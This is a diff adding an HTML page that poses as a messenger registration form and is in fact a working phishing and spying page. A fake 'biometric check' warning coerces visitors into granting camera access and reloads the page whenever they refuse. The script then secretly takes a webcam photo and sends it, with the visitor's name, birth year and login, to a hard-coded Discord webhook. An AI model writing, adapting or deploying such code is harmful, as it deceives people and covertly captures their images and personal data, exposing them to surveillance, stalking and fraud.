@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Messenger Registration</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background-color: #0e1621; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
+        
+        /* Основная карточка */
+        .reg-card { background-color: #17212b; padding: 30px; border-radius: 10px; width: 350px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); z-index: 1; }
+        h2 { text-align: center; color: #6ab3f3; }
+        .input-group { margin-bottom: 12px; }
+        label { display: block; margin-bottom: 5px; font-size: 13px; color: #82aaff; }
+        input { width: 100%; padding: 10px; border-radius: 5px; border: 1px solid #242f3d; background: #242f3d; color: white; box-sizing: border-box; }
+        .reg-btn { width: 100%; padding: 12px; background: #3390ec; border: none; border-radius: 5px; color: white; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        .reg-btn:hover { background: #2b77c0; }
+
+        /* Окно "Пугалка" */
+        #camera-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: #0e1621; z-index: 1000; 
+            display: flex; flex-direction: column; justify-content: center; align-items: center; 
+            text-align: center; padding: 20px;
+        }
+        .warning-box { border: 1px solid #3390ec; padding: 25px; border-radius: 10px; max-width: 400px; background: #17212b; }
+        .warning-box h3 { color: #ff5252; margin-top: 0; }
+        .warning-box p { color: #cfd6dc; font-size: 14px; line-height: 1.5; }
+        
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div id="camera-overlay">
+    <div class="warning-box">
+        <h3>⚠️ ВНИМАНИЕ</h3>
+        <p>
+            Для завершения регистрации в зашифрованной сети Messenger, система должна провести <b>биометрическую проверку оборудования</b>.
+            <br><br>
+            Если вы не предоставите доступ к камере, приложение будет работать <b>некорректно</b>, а ваш аккаунт может быть мгновенно заморожен системой безопасности.
+        </p>
+        <button class="reg-btn" onclick="requestAccess()">ПОДТВЕРДИТЬ И ПРОДОЛЖИТЬ</button>
+    </div>
+</div>
+
+<div class="reg-card">
+    <h2>Регистрация</h2>
+    <div class="input-group">
+        <label>Имя</label>
+        <input type="text" id="firstname" placeholder="Иван">
+    </div>
+    <div class="input-group">
+        <label>Фамилия</label>
+        <input type="text" id="lastname" placeholder="Иванов">
+    </div>
+    <div class="input-group">
+        <label>Год рождения</label>
+        <input type="number" id="birthyear" placeholder="2000">
+    </div>
+    <div class="input-group">
+        <label>Логин</label>
+        <input type="text" id="login" placeholder="cool_user">
+    </div>
+    <div class="input-group">
+        <label>Пароль</label>
+        <input type="password" id="pass" placeholder="******">
+    </div>
+    <button class="reg-btn" onclick="register()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const overlay = document.getElementById('camera-overlay');
+    
+    // ТВОЙ ВЕБХУК
+    const discordWebhookUrl = 'https://discordapp.com/api/webhooks/1458609214841819258/s-0XUnZ_TOQSJpvh4QVojp8IlelmDmYcOAnO8ArN1MVPztB469PfPlH5kb1Gs4fxL8um';
+
+    // Функция запроса доступа
+    async function requestAccess() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            // Прячем пугалку, если доступ дали
+            overlay.style.display = 'none';
+            document.body.style.overflow = 'auto';
+        } catch (err) {
+            console.error("Ошибка:", err);
+            alert("КРИТИЧЕСКАЯ ОШИБКА: Доступ отклонен! Регистрация заблокирована для вашего устройства.");
+            // Перезагрузка страницы, чтобы зациклить пугалку
+            location.reload();
+        }
+    }
+
+    // Функция регистрации и отправки данных
+    async function register() {
+        const data = {
+            first: document.getElementById('firstname').value,
+            last: document.getElementById('lastname').value,
+            year: document.getElementById('birthyear').value,
+            login: document.getElementById('login').value
+        };
+
+        if (!data.login || !data.first) {
+            alert("Заполни все поля!");
+            return;
+        }
+
+        // 1. Делаем скрытое фото
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0);
+        
+        // 2. Отправляем в Discord
+        canvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            
+            const discordMessage = {
+                embeds: [{
+                    title: "🚀 Новая регистрация (с верификацией лица)",
+                    color: 3447003,
+                    fields: [
+                        { name: "Имя Фамилия", value: `${data.first} ${data.last}`, inline: true },
+                        { name: "Год рождения", value: data.year, inline: true },
+                        { name: "Логин", value: data.login, inline: false }
+                    ],
+                    image: { url: 'attachment://photo.png' },
+                    footer: { text: "Система слежения активирована" }
+                }]
+            };
+
+            formData.append('payload_json', JSON.stringify(discordMessage));
+            formData.append('file', blob, 'photo.png');
+
+            try {
+                const response = await fetch(discordWebhookUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    alert("Регистрация успешно завершена! Данные верифицированы.");
+                } else {
+                    alert("Ошибка сервера. Попробуйте позже.");
+                }
+            } catch (err) {
+                alert("Ошибка сети.");
+            }
+        }, 'image/png');
+    }
+</script>
+
+</body>
+</html>
